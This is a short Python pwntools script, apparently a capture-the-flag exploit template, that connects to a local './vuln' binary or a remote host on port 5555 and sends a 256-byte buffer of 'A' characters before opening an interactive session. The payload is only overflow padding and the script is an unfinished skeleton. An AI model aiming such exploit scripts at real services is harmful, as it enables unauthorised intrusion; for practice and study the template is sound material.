from pwn import *

elf = ELF('./vuln')
host, port = "vuln.com", 5555


def conn():
    if args.REMOTE:
        return remote(host, port)
    else:
        return process(['./vuln'])


def exploit():
    r = conn()
    payload = ""
    payload += "A" * (0x100)
    r.sendline(payload.encode())  # sending payl
    r.interactive()


if __name__ == '__main__':
    exploit()
